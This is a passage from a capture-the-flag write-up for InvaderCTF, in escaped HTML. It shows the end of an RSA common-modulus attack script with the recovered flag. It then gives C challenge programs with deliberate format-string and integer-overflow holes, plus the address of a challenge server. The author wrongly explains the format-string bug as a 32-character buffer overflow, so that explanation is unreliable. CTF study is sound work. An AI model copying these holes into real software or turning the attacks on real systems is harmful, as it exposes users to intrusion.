&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;neg_pow&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;neg_pow&lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;	ct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;	m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(gmpy2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;iroot&lt;&#x2F;span&gt;&lt;span&gt;(ct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;g)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11982945131022410542351081395449872615892579857707579658716659690935488669385262821057859182557738914580246000223393286594124225383866984597532935421878496300855873841201081561776719850279196185513497651311088240409358040299378330842236508619359647972763016690363235765860969655129269784424956130539800284778318098141912923725687592311652722505056107470370398021165270753993680221146964650298810348339426550121843506831513763524799788245715184019272818769688806186156054217173423142297185080827697102885478690188900539745266957938792259348667098941846582939290347898221569129727818304319228531810884419349788595299183
&lt;&#x2F;span&gt;&lt;span&gt;e1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1432834983003528423789566679766
&lt;&#x2F;span&gt;&lt;span&gt;e2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2379308237310255832902020443526
&lt;&#x2F;span&gt;&lt;span&gt;c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10689309714150831372003282520258034721869267911572516423408248565049962108650099748793151534577215410589895845939174468496094911105822340567352621464826482784496348432260039948367408369277304473142781582593382249759117725426180831722441987089651228047819100128903524486005240635239107861739718852670683772477033147265282652735461836031051746173537294339800736436758373421135499142186805931851613817214123606130652548146050084102387221849254771049043101744791081688090961965211538682034166530987653637019819142642682927570692406882796783114872064728299928706994667553634162223654351719854271521012272876869577548029865
&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10108112864771204039110360647151162379625435403389064742046377050800935678884417470071380911451172735126940164631419702014060618271946963698795724980506620687308126757038560340598588393457958478150419444430669593694549750182242922247396011389187919036956934428645928391159497083109718312975799586599853937652754710111738660741391329300491640624992257712646153846113376883043637423386066176238663086142253925553012932883285101598565990266200395298234059134450705194609356310121298248102541581987639348408092513592224044341173092657291900970886956196149689937412107716004555806327078173298630211025335704973121968612105
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Convert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;common_modulus&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;c2))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Complete script available at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;X-Vector&#x2F;X-RSA&quot;&gt;github&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;When i run the script with the given &lt;code&gt;N e1 e2 c1 c2 &lt;&#x2F;code&gt; i got the &lt;code&gt;flag&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;PlainText in ascii : InvaderCTF{common_modulus_the_attack_name_is_common_modulus}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;pwn-challenges&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pwn-challenges&quot; aria-label=&quot;Anchor link for: pwn-challenges&quot;&gt;PWN Challenges&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;format-strings&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#format-strings&quot; aria-label=&quot;Anchor link for: format-strings&quot;&gt;Format Strings&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Can you exploit echo file to get the FLAG. nc 198.199.123.169 9003&lt;&#x2F;p&gt;
&lt;p&gt;Provided source code &lt;code&gt;echo.c&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;unistd.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdio.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;alarm&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stderr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;setvbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; _IONBF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; FLAG[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server}&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; buffer[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can you leak the flag?&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter input to echo back:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;buffer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(buffer)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;First of all i executed the provided binary file &lt;code&gt;echo&lt;&#x2F;code&gt;.The program asks for a input. Observe the source program the input is going to be stored in &lt;code&gt;buffer[0x20]&lt;&#x2F;code&gt;.The &lt;code&gt;0x20&lt;&#x2F;code&gt; is equals to 32 in decimal.&lt;&#x2F;p&gt;
&lt;p&gt;If i gave more than 32 characters as input a &lt;code&gt;bufferoverflow&lt;&#x2F;code&gt; will occur it may leads to an unintend outputs.
lets see,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;invaders22&#x2F;format.png&quot; alt=&quot;Format Strings&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;DOOOONE.....!&lt;&#x2F;p&gt;
&lt;p&gt;So, this is a simple bufferoverflow problem. In this way i got this flag &lt;code&gt;^_^&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : InvaderCTF{EZy_PZy_format_strings}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;foodcourt-overflow&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#foodcourt-overflow&quot; aria-label=&quot;Anchor link for: foodcourt-overflow&quot;&gt;FoodCourt Overflow&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;invaders22&#x2F;fc.png&quot; alt=&quot;Format Strings&quot; &#x2F;&gt;{: w=&quot;400&quot; h=&quot;400&quot;}&lt;&#x2F;p&gt;
&lt;p&gt;The name itself says that its a overflow problem again &lt;code&gt;^_~&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The source code of the program running in the remote server is as follows&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;unistd.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdio.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;item&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;cost&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Input the number of &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; you want to buy?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; item)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;scanf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;n)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        cost &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; cost &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;That will cost Rs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; cost)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(cost &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span&gt; wallet) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Order placed!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            wallet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-=&lt;&#x2F;span&gt;&lt;span&gt; cost&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ah man, you don&amp;#39;t have enough money to buy this order&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Nah, buy something.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
